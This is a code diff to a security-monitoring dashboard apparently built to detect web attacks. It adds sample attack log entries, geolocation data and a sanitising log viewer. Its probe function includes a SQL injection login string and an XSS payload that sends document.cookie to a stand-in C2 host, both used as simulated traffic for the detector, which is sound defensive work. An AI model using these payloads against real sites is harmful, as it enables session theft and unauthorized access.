@@ -33,6 +33,7 @@ import {
   XAxis,
   YAxis,
 } from "recharts";
+import SafeLogViewer from "./components/SafeLogViewer";
 
 type Severity = "CRITICAL" | "WARNING" | "NORMAL";
 
@@ -49,6 +50,8 @@ type LogEntry = {
   location?: string | null;
   country?: string | null;
   city?: string | null;
+  latitude?: number | null;
+  longitude?: number | null;
   asn?: string | null;
   probability: number;
   attack_type?: string;
@@ -231,6 +234,90 @@ const defaultLogs: LogEntry[] = [
     features: { url_length: 18, url_entropy: 2.2 },
     raw_line: `[INFO] 2026-10-22 14:20:11 | 172.56.21.8 | Asset request /assets/app.min.js | Status: 304 | Location: null`,
   },
+  {
+    id: 109,
+    timestamp: "2026-10-22 14:19:40",
+    source_ip: "177.18.42.101",
+    method: "POST",
+    endpoint: "/api/v1/payment/checkout?bypass=true",
+    status_code: 403,
+    severity: "CRITICAL",
+    risk: "Critical",
+    message: "Parameter tampering exploit targeting payment authorization",
+    location: "São Paulo, BR",
+    country: "Brazil",
+    city: "São Paulo",
+    latitude: -23.5505,
+    longitude: -46.6333,
+    asn: "AS27699 Claro Brasil",
+    probability: 95.7,
+    attack_type: "Parameter Tampering",
+    features: { url_length: 42, parameter_count: 1, is_post: 1, url_entropy: 3.8 },
+    raw_line: `[CRITICAL] 2026-10-22 14:19:40 | 177.18.42.101 | Parameter tampering on /api/v1/payment | Status: 403 | Location: São Paulo, BR`,
+  },
+  {
+    id: 110,
+    timestamp: "2026-10-22 14:18:15",
+    source_ip: "118.238.10.4",
+    method: "GET",
+    endpoint: "/wp-login.php?action=register&user=admin%27--",
+    status_code: 400,
+    severity: "CRITICAL",
+    risk: "High",
+    message: "Authentication bypass injection against WordPress administrative endpoint",
+    location: "Tokyo, JP",
+    country: "Japan",
+    city: "Tokyo",
+    latitude: 35.6762,
+    longitude: 139.6503,
+    asn: "AS2516 KDDI Corp",
+    probability: 92.1,
+    attack_type: "SQL Injection",
+    features: { url_length: 49, sql_keywords: 1, sql_comments: 1, url_entropy: 4.1 },
+    raw_line: `[CRITICAL] 2026-10-22 14:18:15 | 118.238.10.4 | Auth bypass attempt on /wp-login.php | Status: 400 | Location: Tokyo, JP`,
+  },
+  {
+    id: 111,
+    timestamp: "2026-10-22 14:17:02",
+    source_ip: "139.130.4.5",
+    method: "GET",
+    endpoint: "/actuator/env",
+    status_code: 403,
+    severity: "WARNING",
+    risk: "Medium",
+    message: "Spring Boot actuator environment exposure reconnaissance probe",
+    location: "Sydney, AU",
+    country: "Australia",
+    city: "Sydney",
+    latitude: -33.8688,
+    longitude: 151.2093,
+    asn: "AS1221 Telstra Corp",
+    probability: 79.4,
+    attack_type: "Information Disclosure",
+    features: { url_length: 13, sensitive_files: 1, is_post: 0, url_entropy: 2.8 },
+    raw_line: `[WARNING] 2026-10-22 14:17:02 | 139.130.4.5 | Actuator probe on /actuator/env | Status: 403 | Location: Sydney, AU`,
+  },
+  {
+    id: 112,
+    timestamp: "2026-10-22 14:15:20",
+    source_ip: "94.200.12.8",
+    method: "POST",
+    endpoint: "/xmlrpc.php",
+    status_code: 403,
+    severity: "CRITICAL",
+    risk: "High",
+    message: "XML-RPC brute-force amplification attack vector",
+    location: "Dubai, AE",
+    country: "United Arab Emirates",
+    city: "Dubai",
+    latitude: 25.2048,
+    longitude: 55.2708,
+    asn: "AS5384 Emirates Telecom",
+    probability: 93.8,
+    attack_type: "Brute-Force Amplification",
+    features: { url_length: 11, is_post: 1, url_entropy: 2.9 },
+    raw_line: `[CRITICAL] 2026-10-22 14:15:20 | 94.200.12.8 | XML-RPC brute force attack on /xmlrpc.php | Status: 403 | Location: Dubai, AE`,
+  },
 ];
 
 function mapBackendEvent(ev: any, fallbackId?: number): LogEntry {
@@ -261,6 +348,8 @@ function mapBackendEvent(ev: any, fallbackId?: number): LogEntry {
     location: ev.city && ev.country ? `${ev.city}, ${ev.country}` : (ev.country || "Unknown"),
     country: ev.country || "Unknown",
     city: ev.city || "Unknown",
+    latitude: typeof ev.latitude === "number" ? ev.latitude : undefined,
+    longitude: typeof ev.longitude === "number" ? ev.longitude : undefined,
     asn: ev.asn || (ev.source_ip?.startsWith("192.") || ev.source_ip?.startsWith("10.") ? "Internal RFC1918" : "AS15169 Transit"),
     probability: Math.round((ev.attack_probability ?? (isAttack ? 0.95 : 0.05)) * 1000) / 10,
     attack_type: ev.attack_type || (isAttack ? "Classified Threat" : "Normal Traffic"),
@@ -393,23 +482,36 @@ export default function App() {
   // Inject real external HTTP request through ML pipeline on demand
   async function injectLiveProbe(type: "sqli" | "xss" | "normal") {
     setProbing(true);
+    const attackIps = [
+      "177.18.42.101",  // São Paulo
+      "118.238.10.4",   // Tokyo
+      "89.248.163.78",  // Bucharest
+      "94.200.12.8",    // Dubai
+      "188.40.82.11",   // Frankfurt
+      "139.130.4.5",    // Sydney
+      "165.21.42.1",    // Singapore
+      "102.67.12.90",   // Lagos
+      "52.204.18.91",   // Ashburn
+    ];
+    const pickedIp = attackIps[Math.floor(Math.random() * attackIps.length)];
+
     const probes = {
       sqli: {
-        source_ip: "185.74.22.91",
+        source_ip: pickedIp,
         method: "POST",
         url: "/api/v1/auth/login?user=admin' OR '1'='1' --",
         content_length: 64,
         user_agent: "sqlmap/1.7.2#dev",
       },
       xss: {
-        source_ip: "103.45.18.204",
+        source_ip: pickedIp,
         method: "GET",
         url: "/catalog/search?keyword=<script>fetch('http://c2.botnet.cc/?c='+document.cookie)</script>",
         content_length: 0,
         user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
       },
       normal: {
-        source_ip: "142.250.190.46",
+        source_ip: pickedIp,
         method: "GET",
         url: "/api/v1/system/healthz",
         content_length: 0,
@@ -496,22 +598,49 @@ export default function App() {
       Brazil: { lat: -23.5505, lng: -46.6333 },
       China: { lat: 31.2304, lng: 121.4737 },
       Japan: { lat: 35.6762, lng: 139.6503 },
+      "United Kingdom": { lat: 51.5072, lng: -0.1276 },
+      France: { lat: 48.8566, lng: 2.3522 },
+      Canada: { lat: 43.6532, lng: -79.3832 },
+      Australia: { lat: -33.8688, lng: 151.2093 },
+      Singapore: { lat: 1.3521, lng: 103.8198 },
+      "South Korea": { lat: 37.5665, lng: 126.9780 },
+      Poland: { lat: 52.2297, lng: 21.0122 },
+      Sweden: { lat: 59.3293, lng: 18.0686 },
+      Switzerland: { lat: 47.3769, lng: 8.5417 },
+      Romania: { lat: 44.4268, lng: 26.1025 },
+      Ukraine: { lat: 50.4501, lng: 30.5234 },
+      Argentina: { lat: -34.6037, lng: -58.3816 },
+      Chile: { lat: -33.4489, lng: -70.6693 },
+      Colombia: { lat: 4.7110, lng: -74.0721 },
+      Mexico: { lat: 19.4326, lng: -99.1332 },
+      "United Arab Emirates": { lat: 25.2048, lng: 55.2708 },
+      Israel: { lat: 32.0853, lng: 34.7818 },
+      "Saudi Arabia": { lat: 24.7136, lng: 46.6753 },
+      "South Africa": { lat: -26.2041, lng: 28.0473 },
+      Nigeria: { lat: 6.5244, lng: 3.3792 },
+      Kenya: { lat: -1.2921, lng: 36.8219 },
+      Egypt: { lat: 30.0444, lng: 31.2357 },
+      "Hong Kong": { lat: 22.3193, lng: 114.1694 },
+      Taiwan: { lat: 25.0330, lng: 121.5654 },
     };
 
     logs
       .filter((l) => l.severity === "CRITICAL" || l.severity === "WARNING")
       .forEach((l) => {
-        const country = l.country || "Russia";
+        const country = l.country || "Unknown Country";
         const city = l.city || "Unknown City";
         const key = `${country}-${city}`;
-        const baseCoord = coords[country] || { lat: 40, lng: 10 };
+        const baseCoord = coords[country] || { lat: 35.0, lng: 15.0 };
+        const lat = typeof l.latitude === "number" ? l.latitude : baseCoord.lat;
+        const lng = typeof l.longitude === "number" ? l.longitude : baseCoord.lng;
+
         if (!pinMap[key]) {
           pinMap[key] = {
             ip: l.source_ip,
             country,
             city,
-            latitude: baseCoord.lat,
-            longitude: baseCoord.lng,
+            latitude: lat,
+            longitude: lng,
             attacks: 1,
             risk: l.risk === "Critical" ? "Critical" : "High",
             asn: l.asn || "AS15169 Transit Host",
@@ -848,7 +977,10 @@ export default function App() {
                         <span className="log-status-badge">HTTP {log.status_code}</span>
                       </div>
                       <div className="log-body-line">
-                        <span>{log.message}</span>
+                        <SafeLogViewer
+                          content={log.message}
+                          highlightThreat={log.severity === "CRITICAL"}
+                        />
                       </div>
                       {log.location && log.location !== "null" && (
                         <div className="log-geo-inline">
@@ -1037,7 +1169,7 @@ export default function App() {
                     <div className="detail-cell" style={{ gridColumn: "span 2" }}>
                       <span className="detail-cell-label">Target Endpoint</span>
                       <span className="detail-cell-value" title={selectedLog.endpoint}>
-                        {selectedLog.endpoint}
+                        <SafeLogViewer content={selectedLog.endpoint} />
                       </span>
                     </div>
 
